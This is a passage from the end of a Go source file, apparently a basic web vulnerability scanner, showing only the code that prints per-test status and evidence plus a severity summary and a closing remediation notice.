			fmt.Printf("   Status: %d\n", result.StatusCode)
			fmt.Printf("   Evidence: %s\n", result.Evidence)
		}
	}

	fmt.Println("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Println("📈 SUMMARY")
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("Total Tests: %d\n", len(results))
	fmt.Printf("Vulnerabilities Found: %d\n", vulnerableCount)
	fmt.Printf("  Critical: %d\n", criticalCount)
	fmt.Printf("  High: %d\n", highCount)
	fmt.Printf("  Medium: %d\n", vulnerableCount-criticalCount-highCount)

	if vulnerableCount > 0 {
		fmt.Println("\n⚠️  WARNING: Vulnerabilities detected! Review and remediate immediately.")
	} else {
		fmt.Println("\n✅ No obvious vulnerabilities detected in this scan.")
		fmt.Println("   Note: This is a basic scan. Professional security audit recommended.")
	}
}
